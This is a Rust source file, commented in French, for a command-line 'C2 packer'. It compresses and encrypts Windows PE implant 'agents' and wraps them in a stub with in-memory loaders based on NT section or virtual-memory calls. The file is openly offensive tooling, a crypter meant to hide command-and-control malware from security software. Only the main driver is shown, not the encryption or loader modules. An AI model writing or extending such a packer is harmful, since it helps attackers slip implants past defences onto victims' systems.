mod checksum;
mod compress;
mod encrypt;
mod pe_parser;
mod stub_builder;

use anyhow::{bail, Result};
use clap::Parser;
use std::path::PathBuf;

/// XOR C2 Packer — Protège les agents PE (compression + chiffrement + loader en mémoire)
#[derive(Parser, Debug)]
#[command(name = "packer", version = "0.1.0")]
struct Args {
    /// Exécutable PE d'entrée (agent.exe)
    #[arg(short, long)]
    input: PathBuf,

    /// Chemin de sortie du binaire protégé
    #[arg(short, long)]
    output: PathBuf,

    /// Stub Windows pré-compilé (stub.exe)
    #[arg(long)]
    stub: PathBuf,

    /// Algorithme de chiffrement : "aes" ou "xor"  [défaut: aes]
    #[arg(short, long, default_value = "aes")]
    encryption: String,

    /// Type de loader : "nt_section", "nt_virtual_memory" ou "classic"  [défaut: nt_virtual_memory]
    #[arg(long, default_value = "nt_virtual_memory")]
    loader: String,
}

fn main() -> Result<()> {
    let args = Args::parse();

    println!("[*] Lecture du PE : {}", args.input.display());
    let pe_bytes = pe_parser::read_pe_file(&args.input)?;
    println!("[+] PE valide ({} octets)", pe_bytes.len());

    println!("[*] Compression LZ4...");
    let compressed = compress::compress_payload(&pe_bytes)?;
    println!(
        "[+] Compressé : {} → {} octets ({:.1}%)",
        compressed.original_size,
        compressed.compressed.len(),
        100.0 * compressed.compressed.len() as f64 / compressed.original_size as f64
    );

    println!("[*] Chiffrement ({})...", args.encryption);
    let encrypted = match args.encryption.as_str() {
        "aes"      => encrypt::encrypt_aes256gcm(&compressed.compressed)?,
        "xor"      => encrypt::encrypt_xor(&compressed.compressed),
        "rc4"      => encrypt::encrypt_rc4(&compressed.compressed),
        "chacha20" => encrypt::encrypt_chacha20poly1305(&compressed.compressed)?,
        _ => bail!(
            "Algorithme inconnu : '{}' (utiliser 'aes', 'xor', 'rc4' ou 'chacha20')",
            args.encryption
        ),
    };
    println!("[+] Chiffré : {} octets", encrypted.ciphertext.len());

    let loader_mode: u8 = match args.loader.as_str() {
        "nt_section"        => 0,
        "nt_virtual_memory" => 1,
        "classic"           => 2,
        _ => bail!("Loader inconnu : '{}' (utiliser 'nt_section', 'nt_virtual_memory' ou 'classic')", args.loader),
    };
    println!("[*] Construction du binaire final (loader: {})...", args.loader);
    stub_builder::build_packed_exe(
        &args.stub,
        stub_builder::PackInput {
            encryption_mode: encrypted.mode,
            loader_mode,
            original_size: compressed.original_size,
            payload: encrypted.ciphertext,
            key: encrypted.key,
            nonce: encrypted.nonce,
        },
        &args.output,
    )?;

    println!("[✓] Terminé : {}", args.output.display());
    Ok(())
}
